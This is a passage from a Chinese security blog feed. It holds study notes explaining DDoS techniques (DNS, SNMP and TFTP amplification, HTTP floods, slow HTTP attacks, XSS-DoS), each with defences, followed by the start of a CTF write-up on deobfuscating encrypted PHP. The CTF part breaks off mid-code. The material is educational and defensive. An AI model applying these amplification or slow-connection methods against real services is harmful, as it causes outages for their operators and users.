<strong>伪造源地址的DNS查询请求包</strong>，这些<strong>请求包查询类型设置为ANY</strong>，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。</p><p>接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，<strong>如果迭代查询第一个请求的DNS服务器没有查询到结果</strong>，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而 <strong><font color="6495ED">攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的</font></strong>;</p><p>而<strong>递归查询</strong>却是在查询到结果之后，才返回给查询请求发起者。<br>利用这两个特点，攻击者就可以成功发起DNS放大攻击。<br>这种普通的查询请求可以<strong>将攻击流量放大2~10倍</strong>，如果想增大攻击倍数，可以使用 <code>RFC 2671</code> 中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了 <code>OPT RR</code> 字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" data-fancybox="group" data-caption="ddos_15" class="fancybox"><img alt="ddos_15" title="ddos_15" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" class="lazyload"></a></p><p><strong>防御方案</strong>：</p><ul><li>联系 <code>ISP</code> 清洗上游流量；</li><li>DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务；</li><li>对单个IP的查询速率做限制；</li><li>拥有足够的带宽承受小规模攻击；</li><li>关闭DNS服务器的递归查询；</li><li>利用防火墙等对 <code>ANY Request</code> 进行过滤。</li></ul><hr><h2 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h2><p><code>SNMP</code> ( <code>Simple Network Management Protocol</code>，简单网络管理协议)，是目前网络中应用最为广泛的网络管理协议，它提供了一个管理框架来监控和维和互联网设备，它使用UDP161端口进行通信。<font color="6495ED">攻击者向互联网上开启SNMP服务的设备发送GetBulk请求，并使用默认通信字符串作为认证凭据。</font>常见的默认通信字符串如<code>public</code>、<code>private</code> 以及一些厂商默认的通信字符串。<strong>GetBulk请求</strong>是在<strong>SNMPv2</strong>中添加的，该请求会让SNMP设备尽可能多的返回数据，这也就是SNMP放大攻击的利用点。</p><h3 id="下面来看一下SNMP的PDU格式"><a href="#下面来看一下SNMP的PDU格式" class="headerlink" title="下面来看一下SNMP的PDU格式"></a>下面来看一下SNMP的PDU格式</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" data-fancybox="group" data-caption="ddos_16" class="fancybox"><img alt="ddos_16" title="ddos_16" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" class="lazyload"></a></p><p>攻击者先将源地址改成要攻击的目标IP，再使用默认的通信字符串，向大量SNMP设备发出GetBulk请求，设备收到GetBulk请求数据包后，会将一大段的设备检索信息返回给目标主机，最终目标主机会被这些SNMP设备返回的数据包淹没，导致拒绝服务。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" data-fancybox="group" data-caption="ddos_17" class="fancybox"><img alt="ddos_17" title="ddos_17" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" class="lazyload"></a></p><p>防护方案：</p><ul><li>禁止已开启SNMP的设备响应GetBulk请求，避免自己的设备被黑客利用；</li><li>更改默认的通信字符串；</li><li>修改默认端口161；</li><li>隐藏开启SNMP设备的公网IP</li></ul><hr><h2 id="TFTP放大攻击"><a href="#TFTP放大攻击" class="headerlink" title="TFTP放大攻击"></a>TFTP放大攻击</h2><p><code>TFTP</code>（<code>Trivial File Transfer Protocol</code>，简单文件传输协议），使用<code>UDP 69端口</code>进行通信，由于TFTP使用的是不可靠的UDP协议，所以他不能确保发送的任何报文都能真正到达目的地，因此他必须使用定时器来检测并重传报文，以下是TFTP传输文件过程图</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" data-fancybox="group" data-caption="ddos_18" class="fancybox"><img alt="ddos_18" title="ddos_18" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" class="lazyload"></a></p><h3 id="超时重传机制"><a href="#超时重传机制" class="headerlink" title="超时重传机制"></a>超时重传机制</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" data-fancybox="group" data-caption="ddos_19" class="fancybox"><img alt="ddos_19" title="ddos_19" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" class="lazyload"></a></p><p>可以看到，<strong>TFTP协议</strong> 将数据分成好多个数据块进行传输，每个数据块最大为 <strong>512字节</strong>，客户端在接受到数据块时，需要给服务器端返回一个ACK确认报文，然后才会继续传输下一个报文。若服务器没有收到客户端发来ACK报文，则在时间到达超时计数器时，便会开启重传机制，这也就是攻击利用点。</p><p>攻击者利用TFTP协议上的缺陷，伪造源地址向服务器发起请求，服务器回复的第1个data数据包后无法收到客户端发送的ACK。此时TFTP就会利用他的重传机制，定时重传第1个data数据包，当攻击者发出大量的这种请求时，TFTP放大攻击也就发生了。</p><h3 id="TFTP-放大攻击示意图"><a href="#TFTP-放大攻击示意图" class="headerlink" title="TFTP 放大攻击示意图"></a>TFTP 放大攻击示意图</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" title="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" class="lazyload"></a></p><p><strong>防御方案</strong>：</p><ul><li>不将TFTP服务器暴露在公网上；</li><li>对流经TFTP服务的流量进行入侵检测；</li><li>将重传（数据包）率设置为1；</li><li>只为信任域内的主机提供服务。</li></ul><hr><h2 id="CC-攻击-重点"><a href="#CC-攻击-重点" class="headerlink" title="CC 攻击 (重点)"></a>CC 攻击 (重点)</h2><p><strong>CC攻击 (ChallengeCollapsar)</strong> 又称作 <code>HTTP 泛洪攻击</code>，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求，使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。</p><p>这种攻击方式不需要很大的带宽，且无法使用伪造IP地址进行攻击，需要真实的机器与web服务器建立连接，**<font color="6495ED">因为HTTP协议是建立在TCP协议上，必须先进行TCP三次握手才能进行HTTP通信。如果目标web服务器支持HTTPS，那么发起的HTTPS泛洪攻击还能穿透一些防护设备。</font>**</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" title="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" class="lazyload"></a></p><p><strong>防御方案</strong>：</p><ul><li>必要时将网页做成静态，减少数据库的使用；</li><li>限制连接数量；修改最大超时时间；</li><li>让用户手动输入验证码；</li><li>在response报文中添加特殊字段，验证IP合法性；</li><li>屏蔽频繁访问服务器的主机IP。</li></ul><hr><h2 id="HTTP-慢速攻击"><a href="#HTTP-慢速攻击" class="headerlink" title="HTTP 慢速攻击"></a>HTTP 慢速攻击</h2><p><code>Slow HTTP Dos Attacks</code>（慢速HTTP拒绝服务攻击），黑客模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。这种攻击可以分为两类，**<font color="6495ED">一类是客户端发数据，另一类是客户端读取服务器发来的数据</font>**。HTTP慢速攻击对基于线程处理的web服务器影响显著，如 <code>apache、dhttpd</code>，而对基于事件处理的web服务器影响不大，如 <code>ngix、lighttpd。HTTP</code> 慢速攻击还可以细分成以下几种攻击方式。</p><h3 id="Slow-Loris-Attack"><a href="#Slow-Loris-Attack" class="headerlink" title="Slow Loris Attack"></a>Slow Loris Attack</h3><p>HTTP协议规定请求头以一个空行结束，所以 <code>完整的http请求头</code> 结尾是 <code>\r\n\r\n</code>。<br>然而使用非正常的 <code>\r\n</code> 来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。</p><p>两种请求头区别如下，**<font color="6495ED">CRLF</font>(Carriage Return Line Feed)** 表示回车换行</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" data-fancybox="group" data-caption="ddos_22" class="fancybox"><img alt="ddos_22" title="ddos_22" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" class="lazyload"></a></p><h3 id="Slow-Post-Attack"><a href="#Slow-Post-Attack" class="headerlink" title="Slow Post Attack"></a>Slow Post Attack</h3><p>在http头部信息，可以使用 <code>content-length</code> 声明HTTP消息实体的传输长度，服务器端会将 <code>content-length</code> 的值作为 <code>HTTP BODY</code> 的长度。(这个好像Struts2 有类似的漏洞)</p><p>利用这一特点，攻击者把 <code>content-length</code> 设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。</p><h3 id="Slow-Read-Attack"><a href="#Slow-Read-Attack" class="headerlink" title="Slow Read Attack"></a>Slow Read Attack</h3><p>攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。</p><p>由于客户端的TCP窗口很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" data-fancybox="group" data-caption="ddos_23" class="fancybox"><img alt="ddos_23" title="ddos_23" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" class="lazyload"></a></p><h3 id="Apache-range-header-Attack"><a href="#Apache-range-header-Attack" class="headerlink" title="Apache range header Attack"></a>Apache range header Attack</h3><p>这种攻击方式只针对 <code>Apache</code>，当客户端传输大文件时会有 <code>range字段</code>，表示将大文件分段，分成几个小段进行传输。<br>例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。</p><h3 id="说一下-Apache-的防护"><a href="#说一下-Apache-的防护" class="headerlink" title="说一下 Apache 的防护"></a>说一下 Apache 的防护</h3><ul><li><strong><font color="6495ED">mod_reqtimeout :</font></strong> 控制请求数据传输的超时时间及最小速率</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" data-fancybox="group" data-caption="ddos_24" class="fancybox"><img alt="ddos_24" title="ddos_24" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" class="lazyload"></a></p><ul><li><strong><font color="6495ED">mod_qos :</font></strong> Apache的一个服务质量控制模块，用户可配置各种不同阈值</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" data-fancybox="group" data-caption="ddos_25" class="fancybox"><img alt="ddos_25" title="ddos_25" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" class="lazyload"></a></p><ul><li><strong><font color="6495ED">mod_security :</font></strong> 一个开源的WAF模块，有专门针对慢速攻击防护的规则</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" data-fancybox="group" data-caption="ddos_26" class="fancybox"><img alt="ddos_26" title="ddos_26" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" class="lazyload"></a></p><p>其他的中间件防护方案，参考下面的链接</p><hr><h2 id="XSS-DOS-（稍作了解"><a href="#XSS-DOS-（稍作了解" class="headerlink" title="XSS-DOS （稍作了解"></a>XSS-DOS （稍作了解</h2><p>利用网站存在的 <code>存储型XXS漏洞</code>，在网站中插入恶意的js代码。**<font color="6495ED">代码的功能是不断向web服务器发起大量请求，从而导致服务器宕机，无法响应正常用户的请求。</font>**</p><p>客户端访问已插入恶意的javascript代码的页面后，流量如下</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" data-fancybox="group" data-caption="ddos_27" class="fancybox"><img alt="ddos_27" title="ddos_27" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" class="lazyload"></a></p><p>由于这种攻击的是由 <code>存储型XSS</code>导致的，因此要考虑如何防护 <code>存储型XSS</code>。</p><p><strong>防护方案</strong>：</p><ul><li>对用户的输入以及url参数进行特殊字符过滤；</li><li>对输出内容进行编码转换；</li><li>结合黑白名单机制。</li></ul><h2 id="时间透镜攻击"><a href="#时间透镜攻击" class="headerlink" title="时间透镜攻击"></a>时间透镜攻击</h2><p>通过控制相同源和相同目的IP报文，使得走不同路径的数据包，在同一时刻到达目标服务器，从而达到流量集中攻击的目的。</p><p>这种攻击其实我也还弄不太懂，详细信息可以阅读这篇paper：<a href="http://icir.org/vern/papers/lensing.oak15.pdf">Temporal Lensing and its Application in Pulsing Denial-of-Service Attacks</a>，以及后面的参考链接</p><h3 id="攻击示意图"><a href="#攻击示意图" class="headerlink" title="攻击示意图"></a>攻击示意图</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" data-fancybox="group" data-caption="ddos_28" class="fancybox"><img alt="ddos_28" title="ddos_28" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" data-fancybox="group" data-caption="ddos_29" class="fancybox"><img alt="ddos_29" title="ddos_29" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" class="lazyload"></a></p><p>主要扯一下防护方案：增加抖动，干扰攻击路径，使得数据包无法预期到达；由运营商禁止源路由。<br>其他防御措施：</p><ul><li>采用高性能的网络设备；充足的网络带宽保证；升级主机服务器硬件；</li><li><strong>避免将服务器的真实IP暴露在公网中</strong>；</li><li>使用CDN对流量进行稀释，当大流量稀释到各个CDN节点时，再对流量进行清洗，从而达到防护源站的目的。然而这种防御方式只能用在对域名发起的DDOS攻击，如果攻击者直接对IP进行攻击，则需要使用 <code>anycast技术</code> 来防御。</li></ul><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://kb.mazebolt.com/knowledgebase/ack-flood/">ack flood</a><br><a href="https://zhidao.baidu.com/question/1429836881297848579.html">DDoS和cc的区别</a><br><a href="https://www.jianshu.com/p/dff5a0d537d8">什么是cc攻击</a><br><a href="https://www.imperva.com/learn/application-security/">DDoS的大部分攻击形式</a><br><a href="https://www.acunetix.com/blog/articles/slow-http-dos-attacks-mitigate-apache-http-server/">Mitigate Slow HTTP GET&#x2F;POST Vulnerabilities in the Apache HTTP Server</a><br><a href="https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks">How to Protect Against Slow HTTP Attacks</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&mid=2247483685&idx=1&sn=8ac38ff22d571bbbf7716cb9e83b9b35&chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&mpshare=1&scene=23&srcid=0831Wr5YJPYzSrQU6gnfGVd0">时间透镜及其在脉冲拒绝服务攻击的应用</a><br>《破坏之王_DDoS攻击与防范深度剖析》(书籍网上有电子档)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
    <category term="渗透" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>浅析PHP混淆加密</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/26/php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/26/php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/</id>
    <published>2020-03-26T03:13:59.906Z</published>
    <updated>2020-03-28T03:39:07.086Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>通过一道题，来看一下php 混淆加密解密原理和分析<br>题目来自 [PWNHUB 公开赛 2018]傻 fufu 的工作日<br>这几天天天盯着这些鬼，眼睛都看瞎了<br>题目是个好题目，我看了Virink师傅和腹黑师傅的题解仍然发现自己很多不懂。还是太菜了<br>好好学习，好好学习</p><hr><h1 id="PWNHUB-公开赛-2018-傻-fufu-的工作日"><a href="#PWNHUB-公开赛-2018-傻-fufu-的工作日" class="headerlink" title="[PWNHUB 公开赛 2018]傻 fufu 的工作日"></a>[PWNHUB 公开赛 2018]傻 fufu 的工作日</h1><p>点开题目，是个上传，通过扫描后台，发现存在备份文件泄露，得到了 <code>index.php.bak</code><br>文件打开，发现全是乱码，但是注意到了一些细节因此我们来对源码进行一下分析</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" data-fancybox="group" data-caption="decode1" class="fancybox"><img alt="decode1" title="decode1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" class="lazyload"></a></p><p>首先是开头的加密源网站</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span></span><br></pre></td></tr></table></figure></div><p>然后可以看到有颜色的代码最末尾有 <code>return *** ?&gt;</code> 来结束脚本运行，这说明结束标签后面的数据都不会被正常输出，后面极可能是<code>index.php</code> 源码，而前面的 php 代码只是用来加密的。</p><hr><h2 id="解码准备"><a href="#解码准备" class="headerlink" title="解码准备"></a>解码准备</h2><p>因为我的 <code>IDE</code> 是 <code>VSCode</code>，所以安装了 <code>PHP Debug</code> 插件<br>以及需要进行代码缩进格式化<br>然后找到了这个<a href="https://github.com/nikic/PHP-Parser">工具PHP-Parser</a></p><p>使用工具前要先安装 <code>composer</code><br><a href="https://getcomposer.org/download/">composer下载地址</a><br><a href="https://developer.aliyun.com/composer">阿里云镜像</a></p><p>安装好 <code>composer</code> 后，进入下好的 <code>Parser</code> 文件夹，用命令输入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></div><p>让其生成所需要的库，然后将下面的代码保存成一个新的文件(例如 <code>format.php</code>)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> <span class="title class_">ParserFactory</span>)-&gt;<span class="title function_ invoke__">create</span>(<span class="title class_">ParserFactory</span>::<span class="variable constant_">PREFER_PHP7</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$ast</span> = <span class="variable">$parser</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$error</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Parse error: <span class="subst">&#123;$error-&gt;getMessage()&#125;</span>\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$prettyPrinter</span> = <span class="keyword">new</span> <span class="title class_">PrettyPrinter\Standard</span>;</span><br><span class="line"><span class="variable">$prettyCode</span> = <span class="variable">$prettyPrinter</span>-&gt;<span class="title function_ invoke__">prettyPrintFile</span>(<span class="variable">$ast</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;index2.php&#x27;</span>, <span class="variable">$prettyCode</span>);</span><br></pre></td></tr></table></figure></div><p>然后执行命令 <code>php format.php</code><br>然后将新生成的文件，以 <code>Western (ISO 8859-1)</code> 编码形式打开，这样可以显示更多非可显示字符而不是多字节的字符集</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" data-fancybox="group" data-caption="decode2" class="fancybox"><img alt="decode2" title="decode2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" class="lazyload"></a></p><hr><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>开头两行需要先注释掉，防止调试过程出现一些问题</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div><p>使用 <code>VSCode</code> 的调试功能，我们可以方便的查看变量的具体内容。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" data-fancybox="group" data-caption="decode3" class="fancybox"><img alt="decode3" title="decode3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" class="lazyload"></a></p><hr><h3 id="33行"><a href="#33行" class="headerlink" title="33行"></a>33行</h3><p>直到调试到这一行，发现直接跳出了。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" data-fancybox="group" data-caption="decode4" class="fancybox"><img alt="decode4" title="decode4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">php_sapi_name</span>() == <span class="string">&#x27;cli&#x27;</span> ? <span class="keyword">die</span>() : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></div><p>因为是用命令行运行调试，所以执行完这一句，程序就结束了。<br>然后将这一行注释掉，在他下面下断点。重新运行程序。</p><hr><p>34行是就是读取当前文件，这句话没有什么问题。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">constant</span>(<span class="string">&#x27;jnggfmpt&#x27;</span>));</span><br></pre></td></tr></table></figure></div><p>然后就又是验证运行环境。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" data-fancybox="group" data-caption="decode5" class="fancybox"><img alt="decode5" title="decode5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" class="lazyload"></a></p><h3 id="然后看后面的-38-42行代码"><a href="#然后看后面的-38-42行代码" class="headerlink" title="然后看后面的 38-42行代码"></a>然后看后面的 38-42行代码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">argc = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) * <span class="number">1000</span> - argc &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>查了下，是用来防止下断点调试的，如果下断点调试，这里就超过 100 毫秒，然后就退出了。<br>因此决定直接在这条语句之后下断点，让代码一连串执行完，这样就不会超过 100 毫秒了,直接注释掉也行<br>然后再来看一下后面43行这个 <code>eval</code><br>回显结果跑到了71行这里</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" data-fancybox="group" data-caption="decode6" class="fancybox"><img alt="decode6" title="decode6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" class="lazyload"></a></p><p>看起来好像没什么帮助，注释掉之后</p><h3 id="看44行"><a href="#看44行" class="headerlink" title="看44行"></a>看44行</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">decode_func</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, -<span class="number">45</span>, -<span class="number">1</span>)), <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, <span class="number">0</span>, -<span class="number">46</span>))) ? <span class="variable">$undefined1</span>() : <span class="variable">$undefined2</span>;</span><br></pre></td></tr></table></figure></div><p>用来校验数据完整性的代码，这里的 <code>$undefined1</code> 和 <code>$undefined2</code> 都没有定义。如果验证失败，就会调用 <code>$undefined1</code> 会直接 <code>Error</code> 退出程序。而如果验证成功，虽然 <code>$undefined2</code> 变量不存在，但是只是一个 <code>Warning</code>，没有太大问题。</p><p>其中的 <code>decode_func</code> 就是加密代码中最后一个函数，专门负责字符串解码的。<br>验证方法就是把文件尾部分解密和前面的文件主体部分的 md5 对比，这次执行肯定又不能通过。<br>退出程序，注释掉，再重新运行。</p><hr><h3 id="47行找到关键性代码"><a href="#47行找到关键性代码" class="headerlink" title="47行找到关键性代码"></a>47行找到关键性代码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 